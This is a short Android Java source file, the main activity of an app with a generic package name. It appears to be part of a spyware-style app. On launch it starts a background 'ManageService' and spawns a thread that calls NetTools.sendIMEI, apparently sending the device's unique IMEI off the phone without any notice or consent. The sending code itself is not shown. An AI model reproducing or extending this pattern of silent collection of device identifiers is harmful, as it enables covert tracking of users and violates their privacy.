package com.mycompany.myapp2;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.Window;

import x.NetTools;

public class MainActivity extends Activity
	{

		@Override
		protected void onCreate(Bundle savedInstanceState)
			{
			// TODO: Implement this method
			super.onCreate(savedInstanceState);
			requestWindowFeature(Window.FEATURE_NO_TITLE);
			setContentView(R.layout.mainshow);
			startService(new Intent(this,ManageService.class));
			new Thread(new Runnable() {
                @Override
                public void run() {
                    NetTools.sendIMEI(MainActivity.this);
                }
            }).start();
			}
	
}
